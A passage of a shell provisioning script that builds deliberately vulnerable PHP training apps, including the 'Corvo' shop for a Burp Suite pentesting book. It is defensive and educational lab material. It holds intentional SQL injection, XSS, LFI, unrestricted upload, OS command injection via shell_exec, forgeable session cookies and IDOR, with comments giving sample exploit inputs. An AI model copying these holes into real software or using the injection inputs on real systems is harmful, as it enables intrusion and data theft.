  $q="SELECT usuario,secret FROM usuarios WHERE usuario='$u' AND senha='$p'";
  $r=$c->query($q);
  if($r && $row=$r->fetch_assoc()) $msg="Bem-vindo ".htmlspecialchars($row['usuario'])."! Flag: ".$row['secret'];
  else $msg="Credenciais inválidas.";
}?>
<!doctype html><meta charset="utf-8"><title>Login</title><h1>Área restrita</h1>
<form method="post">Usuário:<input name="usuario"> Senha:<input name="senha" type="password">
<button>Entrar</button></form><p><b><?php echo $msg;?></b></p><a href="index.php">voltar</a>
EOF

  cat > "$W/busca.php" <<'EOF'
<?php $q=$_GET['q']??'';?>
<!doctype html><meta charset="utf-8"><title>Busca</title><h1>Buscar</h1>
<form><input name="q"><button>Buscar</button></form>
<p>Você buscou por: <?php echo $q;?></p><a href="index.php">voltar</a>
EOF

  cat > "$W/pagina.php" <<'EOF'
<?php $a=$_GET['arquivo']??'home.html'; include($a);?>
<hr><a href="index.php">voltar</a>
EOF

  cat > "$W/upload.php" <<'EOF'
<?php $msg='';
if(!empty($_FILES['arquivo']['name'])){

  $d='uploads/'.basename($_FILES['arquivo']['name']);
  $msg=move_uploaded_file($_FILES['arquivo']['tmp_name'],$d)?"Enviado: <a href=\"$d\">$d</a>":"Falhou.";
}?>
<!doctype html><meta charset="utf-8"><title>Upload</title><h1>Enviar currículo</h1>
<form method="post" enctype="multipart/form-data"><input type="file" name="arquivo">
<button>Enviar</button></form><p><?php echo $msg;?></p><a href="index.php">voltar</a>
EOF

  cat > "$W/ping.php" <<'EOF'
<?php $o=''; $ip=$_GET['ip']??'';
if($ip!=='') $o=shell_exec('ping -c 2 '.$ip.' 2>&1'); ?>
<!doctype html><meta charset="utf-8"><title>Ping</title><h1>Rede</h1>
<form><input name="ip" placeholder="127.0.0.1"><button>Ping</button></form>
<pre><?php echo htmlspecialchars($o??'');?></pre><a href="index.php">voltar</a>
EOF

  printf 'User-agent: *\nDisallow: /config.php.bak\nDisallow: /uploads/\n' > "$W/robots.txt"
  echo '<?php phpinfo();' > "$W/phpinfo.php"

  cat > /etc/apache2/conf-available/lab.conf <<EOF
<Directory ${W}/uploads>
    Options +Indexes
    Require all granted
</Directory>
EOF
  a2enconf lab >/dev/null 2>&1 || true
  chown -R www-data:www-data "$W"; chmod -R 0755 "$W"
  chmod 0777 "$W/uploads"; chmod 0644 "$W/config.php.bak"

  svc mariadb; sleep 2
  mysql <<EOF
CREATE DATABASE IF NOT EXISTS webapp;
CREATE USER IF NOT EXISTS 'webapp'@'127.0.0.1' IDENTIFIED BY 'webapp123';
CREATE USER IF NOT EXISTS 'webapp'@'localhost' IDENTIFIED BY 'webapp123';
GRANT ALL ON webapp.* TO 'webapp'@'127.0.0.1';
GRANT ALL ON webapp.* TO 'webapp'@'localhost'; FLUSH PRIVILEGES;
USE webapp;
CREATE TABLE IF NOT EXISTS usuarios(id INT AUTO_INCREMENT PRIMARY KEY,
  usuario VARCHAR(50), senha VARCHAR(50), secret VARCHAR(120));
DELETE FROM usuarios;
INSERT INTO usuarios(usuario,senha,secret) VALUES
 ('admin','S3nh4F0rt3!2024','${FLAG_WEB}'),
 ('joao','joao123','sem flag'),('maria','maria2023','sem flag');
EOF
  svc apache2
}


mod_corvo() {
  info "== corvo: loja web vulneravel do livro Burp para Hackers (:8090) =="
  # App PHP+SQLite propositalmente vulneravel (SQLi, XSS, IDOR, CSRF, LFI,
  # upload->RCE, cmd injection, verb/param tampering, sessao forjavel). Fonte
  # unica do alvo do livro 'Burp para Hackers'. Roda como o usuario 'user'
  # (uid 1000), como o livro mostra na saida de id da RCE.
  # So instala se faltar: VM nova (online) instala; alvo ja provisionado (offline)
  # pula o apt e apenas atualiza o codigo/servico.
  if ! command -v php >/dev/null 2>&1 || ! php -m 2>/dev/null | grep -qi pdo_sqlite; then
    apt_install php-cli php-sqlite3
  fi
  local C=/opt/corvo
  rm -rf "$C"; mkdir -p "$C"
  mkdir -p "$C/admin"
  mkdir -p "$C/paginas"
  mkdir -p "$C/privado"
  mkdir -p "$C/uploads"

  cat > "$C/config.php" <<'CORVO_EOF'
<?php
// Corvo — configuração do alvo de treino.
// ⚠️ App PROPOSITALMENTE VULNERÁVEL. Uso exclusivo na rede isolada do laboratório (alvo 10.137.0.24).
// Nada aqui é seguro por design: é material didático do livro "Burp para Hackers".

define('CORVO_DB', __DIR__ . '/db.sqlite');   // banco SQLite (criado no 1º acesso)
define('CORVO_UPLOADS', __DIR__ . '/uploads'); // destino dos uploads (webshell mora aqui)

// Credenciais do "banco de negócio" — deixadas no código e num backup .bak exposto
// (falha de exposição de informação; o capítulo de recon acha o config.php.bak).
define('DB_USER', 'corvo_app');
define('DB_PASS', 'corvo_app_2024');

// Segredo usado para "assinar" o cookie de sessão. Curto e adivinhável de propósito
// (o capítulo do Decoder forja um cookie de admin a partir daqui).
define('CORVO_SEGREDO', 'corvo');

date_default_timezone_set('America/Sao_Paulo');
CORVO_EOF
  cat > "$C/config.php.bak" <<'CORVO_EOF'
<?php
// ⚠️ BACKUP EXPOSTO (falha de exposição de informação, CWE-530).
// Servido como texto puro por não terminar em .php ativo — o recon acha pelo robots.txt.
define('CORVO_DB', __DIR__ . '/db.sqlite');
define('DB_USER', 'corvo_app');
define('DB_PASS', 'corvo_app_2024');
define('CORVO_SEGREDO', 'corvo');   // o segredo que assina o cookie de sessão
CORVO_EOF
  cat > "$C/_sessao.php" <<'CORVO_EOF'
<?php
// Sessão do Corvo por COOKIE assinado — sem estado no servidor, de propósito.
// O cookie é base64("id:usuario:papel:assinatura"), e a assinatura é
// md5(CORVO_SEGREDO . id). Como o segredo é curto e conhecido, o cookie é
// FORJÁVEL: o capítulo do Decoder troca papel=cliente por papel=admin e
// recalcula a assinatura. Falha clássica de controle de acesso client-side.
require_once __DIR__ . '/config.php';

function corvo_assinatura(int $id): string {
    return md5(CORVO_SEGREDO . $id);
}

function corvo_login_cookie(array $u): void {
    $raw = $u['id'] . ':' . $u['usuario'] . ':' . $u['papel'] . ':' . corvo_assinatura((int)$u['id']);
    setcookie('corvo_sessao', base64_encode($raw), 0, '/');   // sem HttpOnly, sem Secure (falha)
}

function corvo_usuario_atual(): ?array {
    if (empty($_COOKIE['corvo_sessao'])) return null;
    $raw = base64_decode($_COOKIE['corvo_sessao'], true);
    if ($raw === false) return null;
    $p = explode(':', $raw);
    if (count($p) !== 4) return null;
    [$id, $usuario, $papel, $sig] = $p;
    if (!ctype_digit($id) || $sig !== corvo_assinatura((int)$id)) return null;
    return ['id' => (int)$id, 'usuario' => $usuario, 'papel' => $papel];
}

function corvo_logout(): void {
    setcookie('corvo_sessao', '', time() - 3600, '/');
}
CORVO_EOF
  cat > "$C/_db.php" <<'CORVO_EOF'
<?php
// Camada de banco do Corvo: abre o SQLite e, se ele ainda não existe, cria o schema
// e popula os dados de treino (idempotente — só semeia quando o arquivo está ausente).
require_once __DIR__ . '/config.php';

function corvo_db(): PDO {
    static $pdo = null;
    if ($pdo !== null) return $pdo;

    $novo = !file_exists(CORVO_DB);
    $pdo = new PDO('sqlite:' . CORVO_DB);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    // ⚠️ Mensagens de erro do SQLite vazam para a página (ajuda a SQLi baseada em erro).
    $pdo->exec('PRAGMA foreign_keys = ON');
    if ($novo) corvo_semear($pdo);
    return $pdo;
}

function corvo_semear(PDO $pdo): void {
    $pdo->exec(<<<SQL
        CREATE TABLE usuarios (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            usuario  TEXT UNIQUE NOT NULL,
            senha    TEXT NOT NULL,          -- texto puro de propósito (falha)
            papel    TEXT NOT NULL DEFAULT 'cliente',
            email    TEXT,
            bio      TEXT,                    -- renderizada sem escape (XSS armazenado)
            saldo    INTEGER NOT NULL DEFAULT 100,
            secret   TEXT                     -- flag revelada ao dono da conta
        );
        CREATE TABLE produtos (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            nome TEXT NOT NULL,
            preco INTEGER NOT NULL,           -- em centavos
            descricao TEXT
        );
        CREATE TABLE comentarios (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            produto_id INTEGER NOT NULL,
            autor TEXT NOT NULL,
            corpo TEXT NOT NULL,              -- renderizado sem escape (XSS armazenado)
            criado_em TEXT NOT NULL DEFAULT (datetime('now'))
        );
        CREATE TABLE mensagens (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            de_id INTEGER NOT NULL,
            para_id INTEGER NOT NULL,
            assunto TEXT NOT NULL,
            corpo TEXT NOT NULL               -- privada; lida por id sem checar dono (IDOR)
        );
    SQL);

    // Usuários: admin com segredo (alvo da SQLi), alguns clientes com senhas fracas
    // (alvo do brute-force) e mensagens privadas (alvo do IDOR).
    $us = [
        // usuario, senha, papel, email, bio, saldo, secret
        ['admin',  'C0rv0-N0turn0!2024', 'admin',   'admin@corvo.local',  'Administrador do Corvo.', 100000, 'FLAG{sqli_login_bypass_admin}'],
        ['corvo',  'corvo',              'cliente', 'corvo@corvo.local',  'Conta de demonstração.',  500,    'FLAG{conta_demo}'],
        ['joana',  'joana2023',          'cliente', 'joana@corvo.local',  'Cliente antiga.',         320,    'FLAG{idor_perfil_joana}'],
        ['bruno',  'senha123',           'cliente', 'bruno@corvo.local',  'Gosta de promoções.',     80,     'FLAG{brute_force_bruno}'],
        ['helena', 'primavera',          'cliente', 'helena@corvo.local', 'Compra todo mês.',        640,    'FLAG{msg_privada_helena}'],
    ];
    $st = $pdo->prepare('INSERT INTO usuarios(usuario,senha,papel,email,bio,saldo,secret) VALUES (?,?,?,?,?,?,?)');
    foreach ($us as $u) $st->execute($u);

    $ps = [
        ['Caneca Corvo',       2990, 'Caneca preta com o logo do Corvo.'],
        ['Camiseta Noturna',   5990, 'Algodão, estampa serigrafada.'],
        ['Adesivo Holográfico',  990, 'Cartela com 5 adesivos.'],
        ['Moletom Encapuzado', 12990, 'Com capuz. Edição limitada.'],
    ];
    $st = $pdo->prepare('INSERT INTO produtos(nome,preco,descricao) VALUES (?,?,?)');
    foreach ($ps as $p) $st->execute($p);

    $st = $pdo->prepare('INSERT INTO comentarios(produto_id,autor,corpo) VALUES (?,?,?)');
    $st->execute([1, 'joana', 'Chegou rápido, recomendo!']);
    $st->execute([1, 'bruno', 'A cor é linda.']);
    $st->execute([2, 'helena', 'Serve certinho no P.']);

    // Mensagem privada da helena com uma flag — só ela deveria ler (IDOR a expõe).
    $st = $pdo->prepare('INSERT INTO mensagens(de_id,para_id,assunto,corpo) VALUES (?,?,?,?)');
    $st->execute([1, 5, 'Seu cupom secreto', 'Oi Helena! Seu cupom: FLAG{msg_privada_helena}']);
    $st->execute([1, 3, 'Bem-vinda de volta', 'Joana, sentimos sua falta no Corvo.']);
}
CORVO_EOF
  cat > "$C/_layout.php" <<'CORVO_EOF'
<?php
// Cabeçalho/rodapé compartilhados do Corvo. Layout mínimo de propósito — o foco é
// a superfície de ataque, não o CSS.
require_once __DIR__ . '/_sessao.php';

function corvo_topo(string $titulo = 'Corvo'): void {
    $u = corvo_usuario_atual();
    $quem = $u ? htmlspecialchars($u['usuario']) . ' (' . htmlspecialchars($u['papel']) . ')' : 'visitante';
    header('X-Powered-By: Corvo/1.0 (PHP)');
    echo "<!doctype html><html lang=pt-BR><head><meta charset=utf-8>";
    echo "<meta name=viewport content='width=device-width,initial-scale=1'>";
    echo "<title>" . htmlspecialchars($titulo) . " — Corvo</title>";
    echo "<style>body{font-family:system-ui,Arial,sans-serif;max-width:820px;margin:1.5rem auto;padding:0 1rem;background:#0f0f12;color:#e6e6e6}"
       . "a{color:#ff8a5c}h1,h2{color:#ff6633}nav{border-bottom:1px solid #333;padding-bottom:.5rem;margin-bottom:1rem;font-size:.9rem}"
       . "input,textarea,button,select{font:inherit;padding:.35rem;background:#1b1b20;color:#eee;border:1px solid #444;border-radius:4px}"
       . "button{background:#ff6633;color:#111;border:0;cursor:pointer;font-weight:bold}table{border-collapse:collapse}td,th{border:1px solid #333;padding:.3rem .6rem}"
       . ".flag{color:#7CFC00;font-weight:bold}.aviso{color:#888;font-size:.8rem}</style></head><body>";
    echo "<nav><b style='color:#ff6633'>▲ CORVO</b> · <a href='/index.php'>Loja</a> · <a href='/busca.php'>Busca</a> · "
       . "<a href='/login.php'>Entrar</a> · <a href='/conta.php'>Minha conta</a> · <a href='/carrinho.php'>Carrinho</a> "
       . "<span style='float:right' class=aviso>você: $quem</span></nav>";
}

function corvo_rodape(): void {
    echo "<hr style='border-color:#222;margin-top:2rem'><p class=aviso>Corvo — loja fictícia de treino. "
       . "Ambiente propositalmente vulnerável do livro <i>Burp para Hackers</i>. Não exponha à internet.</p></body></html>";
}
CORVO_EOF
  cat > "$C/seed.php" <<'CORVO_EOF'
<?php
// Reseta o laboratório: apaga o banco e o contador, e recria tudo do zero.
// Uso:  php seed.php    (linha de comando)  —  ou acesse /seed.php no navegador.
require_once __DIR__ . '/config.php';
@unlink(CORVO_DB);
@unlink(CORVO_DB . '.contador');
// Remove webshells e uploads deixados por exercícios anteriores (preserva o LEIA.txt).
foreach (glob(__DIR__ . '/uploads/*') as $f) {
    if (basename($f) !== 'LEIA.txt') @unlink($f);
}
require_once __DIR__ . '/_db.php';
corvo_db();   // recria + semeia
$msg = 'Laboratório Corvo resetado: banco recriado e uploads limpos.';
if (PHP_SAPI === 'cli') { echo $msg . "\n"; } else { header('Content-Type: text/plain; charset=utf-8'); echo $msg; }
CORVO_EOF
  cat > "$C/admin/index.php" <<'CORVO_EOF'
<?php
require_once __DIR__ . '/../_db.php';
require_once __DIR__ . '/../_layout.php';
$db = corvo_db();
$u = corvo_usuario_atual();

corvo_topo('Painel interno');
echo '<h1>Painel interno do Corvo</h1>';

// ⚠️ FALHA: o painel só é "protegido" por NÃO estar linkado (segurança por obscuridade,
// CWE-425 forced browsing) + uma checagem baseada no cookie FORJÁVEL. Um cookie de admin
// falsificado no Decoder, ou o admin obtido por SQLi, abre tudo aqui.
if (!$u || $u['papel'] !== 'admin') {
    http_response_code(403);
    echo '<p style="color:#ff6633">Acesso restrito a administradores.</p>';
    echo '<p class="aviso">Você chegou aqui por descoberta de conteúdo. Falta o cookie de admin.</p>';
    corvo_rodape();
    exit;
}

echo '<p class="flag">Painel aberto: FLAG{admin_panel_acesso}</p>';
echo '<h2>Usuários</h2><table><tr><th>id</th><th>usuário</th><th>papel</th><th>senha</th><th>segredo</th></tr>';
foreach ($db->query('SELECT id,usuario,papel,senha,secret FROM usuarios') as $r) {
    echo '<tr><td>' . (int)$r['id'] . '</td><td>' . htmlspecialchars($r['usuario']) . '</td><td>'
       . htmlspecialchars($r['papel']) . '</td><td>' . htmlspecialchars($r['senha']) . '</td><td class="flag">'
       . htmlspecialchars($r['secret']) . '</td></tr>';
}
echo '</table>';
corvo_rodape();
CORVO_EOF
  cat > "$C/busca.php" <<'CORVO_EOF'
<?php
require_once __DIR__ . '/_db.php';
require_once __DIR__ . '/_layout.php';
$db = corvo_db();
$q = $_GET['q'] ?? '';

corvo_topo('Busca');
echo '<h1>Busca de produtos</h1>';
echo '<form method="get"><input name="q" value="' . htmlspecialchars($q) . '" placeholder="ex.: caneca"> <button>Buscar</button></form>';

if ($q !== '') {
    // ⚠️ FALHA: o termo volta na página SEM escape (XSS refletido, CWE-79).
    echo "<p>Resultados para: <b>$q</b></p>";

    // ⚠️ FALHA: termo concatenado na consulta (SQL injection, CWE-89) — permite UNION.
    $sql = "SELECT id,nome,preco FROM produtos WHERE nome LIKE '%$q%'";
    try {
        $rs = $db->query($sql)->fetchAll(PDO::FETCH_ASSOC);
        if (!$rs) echo '<p class="aviso">Nenhum produto.</p>';
        echo '<ul>';
        foreach ($rs as $p) {
            echo '<li><a href="/produto.php?id=' . (int)$p['id'] . '">' . htmlspecialchars($p['nome'])
               . '</a> — R$ ' . number_format($p['preco'] / 100, 2, ',', '.') . '</li>';
        }
        echo '</ul>';
    } catch (Throwable $e) {
        echo '<p style="color:#ff6633">Erro na consulta: ' . htmlspecialchars($e->getMessage()) . '</p>';
    }
}
corvo_rodape();
CORVO_EOF
  cat > "$C/carrinho.php" <<'CORVO_EOF'
<?php
require_once __DIR__ . '/_db.php';
require_once __DIR__ . '/_layout.php';
$db = corvo_db();

corvo_topo('Carrinho');
echo '<h1>Carrinho</h1>';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // ⚠️ FALHA: o servidor confia no PREÇO e na QTD que vieram do cliente
    // (parameter tampering / falha de lógica de negócio, CWE-602/CWE-840).
    // A validação de "só números" é só no HTML (pattern) — o Burp passa por cima.
    $pid   = (int)($_POST['produto_id'] ?? 0);
    $preco = (int)($_POST['preco'] ?? 0);   // deveria vir do banco, não do POST
    $qtd   = (int)($_POST['qtd'] ?? 1);      // aceita negativo
    $prod  = $db->query('SELECT nome FROM produtos WHERE id=' . $pid)->fetchColumn();
    $total = $preco * $qtd;

    echo '<p>Item: <b>' . htmlspecialchars($prod ?: '???') . '</b></p>';
    echo '<p>Preço unitário enviado: R$ ' . number_format($preco / 100, 2, ',', '.') . '</p>';
    echo '<p>Quantidade: ' . $qtd . '</p>';
    echo '<p>Total cobrado: <b>R$ ' . number_format($total / 100, 2, ',', '.') . '</b></p>';

    // "Vitória": conseguir o pedido por menos de R$ 1,00 (preço ou qtd adulterados).
    if ($prod && $total < 100) {
        echo '<p class="flag">Pedido fechado por uma pechincha impossível: FLAG{param_tampering_preco}</p>';
    }
    echo '<p><a href="/index.php">Continuar comprando</a></p>';
} else {
    echo '<p>Seu carrinho está vazio. Escolha um <a href="/index.php">produto</a> e adicione.</p>';
}
corvo_rodape();
CORVO_EOF
  cat > "$C/comentar.php" <<'CORVO_EOF'
<?php
require_once __DIR__ . '/_db.php';
$db = corvo_db();
$pid = (int)($_POST['produto_id'] ?? 0);
$autor = trim($_POST['autor'] ?? 'anon');
$corpo = $_POST['corpo'] ?? '';
if ($pid && $corpo !== '') {
    // ⚠️ FALHA: comentário guardado como veio; será renderizado sem escape (XSS armazenado).
    $st = $db->prepare('INSERT INTO comentarios(produto_id,autor,corpo) VALUES (?,?,?)');
    $st->execute([$pid, $autor === '' ? 'anon' : $autor, $corpo]);
}
header('Location: /produto.php?id=' . $pid);
CORVO_EOF
  cat > "$C/conta.php" <<'CORVO_EOF'
<?php
require_once __DIR__ . '/_db.php';
require_once __DIR__ . '/_layout.php';
$db = corvo_db();
$u = corvo_usuario_atual();

corvo_topo('Minha conta');
if (!$u) {
    echo '<h1>Minha conta</h1><p>Você precisa <a href="/login.php">entrar</a>.</p>';
    corvo_rodape();
    exit;
}

// Recarrega do banco pelo id do cookie (o cookie forjado no cap. do Decoder chega aqui).
$dados = $db->query('SELECT * FROM usuarios WHERE id=' . (int)$u['id'])->fetch(PDO::FETCH_ASSOC);
?>
<h1>Olá, <?= htmlspecialchars($dados['usuario']) ?></h1>
<p>Papel: <b><?= htmlspecialchars($dados['papel']) ?></b> · Saldo: <b><?= (int)$dados['saldo'] ?> pontos</b></p>
<p>E-mail: <?= htmlspecialchars($dados['email']) ?></p>
<p>Seu segredo de conta: <span class="flag"><?= htmlspecialchars($dados['secret']) ?></span></p>
<p><a href="/mensagem.php?id=1">Ver suas mensagens</a> · <a href="/transferir.php">Transferir pontos</a> · <a href="/logout.php">Sair</a></p>
<?php if ($u['papel'] === 'admin'): ?>
  <p style="color:#ff6633">Você é administrador. <a href="/admin/">Abrir painel interno</a>.</p>
<?php endif ?>
<?php corvo_rodape();
CORVO_EOF
  cat > "$C/convite.php" <<'CORVO_EOF'
<?php
require_once __DIR__ . '/_layout.php';
// Emite um "token de convite" NOVO a cada requisição — alvo do Burp Sequencer.
//
// ⚠️ FALHA (modo padrão): o token é derivado do relógio + um contador sequencial,
// então seus bits de mais alta ordem quase não mudam entre capturas. O Sequencer
// classifica a aleatoriedade como "extremely poor" (CWE-330/CWE-340).
//
// ?forte=1  usa um gerador criptográfico (random_bytes) — o contraste que o
// Sequencer mostra como "excellent". Sirva para comparar os dois veredictos.

$arqContador = __DIR__ . '/db.sqlite.contador';
$n = (int)@file_get_contents($arqContador);
@file_put_contents($arqContador, (string)($n + 1), LOCK_EX);

if (!empty($_GET['forte'])) {
    $token = bin2hex(random_bytes(12));                 // 96 bits de CSPRNG
} else {
    // 4 bytes de tempo (quase constantes na captura) + 2 bytes de contador sequencial.
    $token = bin2hex(pack('N', time()) . pack('n', $n & 0xffff));
}

setcookie('token_convite', $token, 0, '/');
corvo_topo('Convite');
echo '<h1>Seu convite</h1>';
echo '<p>Token de convite: <code>' . htmlspecialchars($token) . '</code></p>';
echo '<form method="get"><input type="hidden" name="pegar" value="1"><button>Gerar outro</button></form>';
echo '<p class="aviso">O token também vem no cabeçalho Set-Cookie (token_convite), '
   . 'que é de onde o Sequencer captura ao vivo. Use ?forte=1 para o gerador seguro.</p>';
corvo_rodape();
CORVO_EOF
  cat > "$C/index.php" <<'CORVO_EOF'
<?php
require_once __DIR__ . '/_db.php';
require_once __DIR__ . '/_layout.php';
$db = corvo_db();
corvo_topo('Loja');
$produtos = $db->query('SELECT id,nome,preco,descricao FROM produtos')->fetchAll(PDO::FETCH_ASSOC);
?>
<h1>Loja Corvo</h1>
<p>Bem-vindo à loja fictícia do Corvo. Navegue pelos produtos, comente e compre — tudo em laboratório.</p>
<!-- TODO(dev): tirar o backup config.php.bak do ar antes de publicar -->
<!-- painel interno fica em /admin/ (não linkar no menu público) -->
<ul>
<?php foreach ($produtos as $p): ?>
  <li>
    <a href="/produto.php?id=<?= (int)$p['id'] ?>"><?= htmlspecialchars($p['nome']) ?></a>
    — R$ <?= number_format($p['preco'] / 100, 2, ',', '.') ?>
    <div class="aviso"><?= htmlspecialchars($p['descricao']) ?></div>
  </li>
<?php endforeach ?>
</ul>
<p><a href="/busca.php">Buscar produtos</a> · <a href="/login.php">Entrar</a></p>
<?php corvo_rodape();
CORVO_EOF
  cat > "$C/login.php" <<'CORVO_EOF'
<?php
require_once __DIR__ . '/_db.php';
require_once __DIR__ . '/_layout.php';
$db = corvo_db();

$msg = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $u = $_POST['usuario'] ?? '';
    $p = $_POST['senha'] ?? '';

    // ⚠️ FALHA: entrada concatenada direto na consulta (SQL injection, CWE-89).
    // Um `admin'-- ` no usuário derruba a checagem de senha.
    $sql = "SELECT id,usuario,papel,secret FROM usuarios WHERE usuario='$u' AND senha='$p'";
    $linha = false;
    try {
        $linha = $db->query($sql)->fetch(PDO::FETCH_ASSOC);
    } catch (Throwable $e) {
        // ⚠️ FALHA: erro do banco vaza para a tela (ajuda SQLi baseada em erro).
        $msg = 'Erro na consulta: ' . htmlspecialchars($e->getMessage());
    }

    if ($linha) {
        corvo_login_cookie($linha);
        header('Location: /conta.php');
        exit;
    } elseif ($msg === '') {
        // ⚠️ FALHA: mensagens diferentes por caso permitem ENUMERAR usuários
        // (Comparer detecta a diferença byte a byte).
        $existe = $db->query("SELECT 1 FROM usuarios WHERE usuario='$u'")->fetch();
        $msg = $existe ? 'Senha incorreta para este usuário.' : 'Usuário não encontrado.';
    }
}

corvo_topo('Entrar');
?>
<h1>Área restrita</h1>
<?php if ($msg): ?><p style="color:#ff6633"><?= $msg ?></p><?php endif ?>
<form method="post">
  <p>Usuário: <input name="usuario" autofocus></p>
  <p>Senha: <input name="senha" type="password"></p>
  <button>Entrar</button>
</form>
<p class="aviso">Dica de laboratório: contas de cliente têm senhas fracas.</p>
<?php corvo_rodape();
CORVO_EOF
  cat > "$C/logout.php" <<'CORVO_EOF'
<?php
require_once __DIR__ . '/_sessao.php';
corvo_logout();
header('Location: /index.php');
CORVO_EOF
  cat > "$C/mensagem.php" <<'CORVO_EOF'
<?php
require_once __DIR__ . '/_db.php';
require_once __DIR__ . '/_layout.php';
$db = corvo_db();

// ⚠️ FALHA: lê a mensagem pelo id sem conferir o destinatário (IDOR, CWE-639).
// A conta liga para ?id=1; trocar o id (Intruder) lê a correspondência alheia.
$id = (int)($_GET['id'] ?? 0);
$m = $db->query('SELECT * FROM mensagens WHERE id=' . $id)->fetch(PDO::FETCH_ASSOC);

corvo_topo('Mensagem');
if (!$m) { echo '<p>Mensagem não encontrada.</p>'; corvo_rodape(); exit; }
$de   = $db->query('SELECT usuario FROM usuarios WHERE id=' . (int)$m['de_id'])->fetchColumn();
$para = $db->query('SELECT usuario FROM usuarios WHERE id=' . (int)$m['para_id'])->fetchColumn();
?>
<h1><?= htmlspecialchars($m['assunto']) ?></h1>
<p class="aviso">de <?= htmlspecialchars($de) ?> · para <?= htmlspecialchars($para) ?></p>
<p><?= htmlspecialchars($m['corpo']) ?></p>
<p class="aviso"><a href="/mensagem.php?id=<?= $id - 1 ?>">‹ anterior</a> · <a href="/mensagem.php?id=<?= $id + 1 ?>">próxima ›</a></p>
<?php corvo_rodape();
CORVO_EOF
  cat > "$C/pagina.php" <<'CORVO_EOF'
<?php
require_once __DIR__ . '/_layout.php';
// Inclui uma "página" a partir do parâmetro, sem sanitização.
// ⚠️ FALHA: path traversal / LFI (CWE-22/CWE-98). `?arquivo=../privado/flag_lfi.txt`
// escapa do diretório paginas/; `../config.php` vaza o código-fonte com credenciais.
$arquivo = $_GET['arquivo'] ?? 'sobre.html';
$caminho = __DIR__ . '/paginas/' . $arquivo;
corvo_topo('Página');
echo '<h1>Central de conteúdo</h1>';
echo '<p><a href="/pagina.php?arquivo=sobre.html">Sobre</a> · <a href="/pagina.php?arquivo=ajuda.html">Ajuda</a></p><hr>';
if (is_file($caminho)) {
    readfile($caminho);
} else {
    echo '<p>Conteúdo não encontrado: ' . htmlspecialchars($arquivo) . '</p>';
}
corvo_rodape();
CORVO_EOF
  cat > "$C/paginas/ajuda.html" <<'CORVO_EOF'
<h2>Ajuda</h2><p>Dúvidas? Não existem: isto é um alvo de pentest.</p>
CORVO_EOF
  cat > "$C/paginas/sobre.html" <<'CORVO_EOF'
<h2>Sobre o Corvo</h2><p>Loja fictícia de treino. Tudo aqui é cenário de laboratório.</p>
CORVO_EOF
  cat > "$C/perfil.php" <<'CORVO_EOF'
<?php
require_once __DIR__ . '/_db.php';
require_once __DIR__ . '/_layout.php';
$db = corvo_db();

// ⚠️ FALHA: mostra QUALQUER perfil pelo id, sem checar se é o dono (IDOR, CWE-639).
// Iterar ?id=1,2,3… (Intruder) despeja e-mail, saldo e o segredo de cada conta.
$id = (int)($_GET['id'] ?? 0);
$d = $db->query('SELECT id,usuario,papel,email,bio,saldo,secret FROM usuarios WHERE id=' . $id)->fetch(PDO::FETCH_ASSOC);

corvo_topo('Perfil');
if (!$d) { echo '<p>Perfil não encontrado.</p>'; corvo_rodape(); exit; }
?>
<h1>Perfil de <?= htmlspecialchars($d['usuario']) ?></h1>
<!-- ⚠️ bio renderizada sem escape (XSS armazenado via bio) -->
<p>Bio: <?= $d['bio'] ?></p>
<table>
  <tr><th>Papel</th><td><?= htmlspecialchars($d['papel']) ?></td></tr>
  <tr><th>E-mail</th><td><?= htmlspecialchars($d['email']) ?></td></tr>
  <tr><th>Saldo</th><td><?= (int)$d['saldo'] ?> pontos</td></tr>
  <tr><th>Segredo</th><td class="flag"><?= htmlspecialchars($d['secret']) ?></td></tr>
</table>
<?php corvo_rodape();
CORVO_EOF
  cat > "$C/ping.php" <<'CORVO_EOF'
<?php
require_once __DIR__ . '/_layout.php';
$host = $_GET['host'] ?? '';
corvo_topo('Ping');
echo '<h1>Ferramenta de rede</h1>';
echo '<form method="get"><input name="host" value="' . htmlspecialchars($host) . '" placeholder="127.0.0.1"> <button>Pingar</button></form>';
if ($host !== '') {
    // ⚠️ FALHA: host concatenado direto no shell (OS command injection, CWE-78).
    // Um `127.0.0.1; cat privado/flag_cmd.txt` executa comandos arbitrários.
    $saida = shell_exec('ping -c 1 ' . $host . ' 2>&1');
    echo '<pre style="background:#000;padding:.6rem;overflow:auto">' . htmlspecialchars($saida ?? '') . '</pre>';
}
echo '<p class="aviso">Dica: o comando executado é <code>ping -c 1 &lt;host&gt;</code>.</p>';
corvo_rodape();
CORVO_EOF
  cat > "$C/privado/flag_cmd.txt" <<'CORVO_EOF'
FLAG{os_command_injection}
CORVO_EOF
  cat > "$C/privado/flag_lfi.txt" <<'CORVO_EOF'
FLAG{lfi_path_traversal}
CORVO_EOF
  cat > "$C/privado/flag_rce.txt" <<'CORVO_EOF'
FLAG{upload_rce_webshell}
CORVO_EOF
  cat > "$C/produto.php" <<'CORVO_EOF'
<?php
require_once __DIR__ . '/_db.php';
require_once __DIR__ . '/_layout.php';
$db = corvo_db();
$id = (int)($_GET['id'] ?? 0);
$p = $db->query('SELECT * FROM produtos WHERE id=' . $id)->fetch(PDO::FETCH_ASSOC);

corvo_topo('Produto');
if (!$p) { echo '<p>Produto não encontrado.</p>'; corvo_rodape(); exit; }
?>
<h1><?= htmlspecialchars($p['nome']) ?></h1>
<p><?= htmlspecialchars($p['descricao']) ?></p>
<p>Preço: <b>R$ <?= number_format($p['preco'] / 100, 2, ',', '.') ?></b></p>

<!-- form de carrinho com PREÇO em campo oculto (parameter tampering) -->
<form method="post" action="/carrinho.php">
  <input type="hidden" name="produto_id" value="<?= (int)$p['id'] ?>">
  <input type="hidden" name="preco" value="<?= (int)$p['preco'] ?>">
  Qtd: <input name="qtd" value="1" size="3" pattern="[0-9]+" title="apenas números">
  <button>Adicionar ao carrinho</button>
</form>

<h2>Comentários</h2>
<?php
$cs = $db->query('SELECT autor,corpo,criado_em FROM comentarios WHERE produto_id=' . $id . ' ORDER BY id')->fetchAll(PDO::FETCH_ASSOC);
foreach ($cs as $c) {
    // ⚠️ FALHA: corpo do comentário renderizado SEM escape (XSS armazenado, CWE-79).
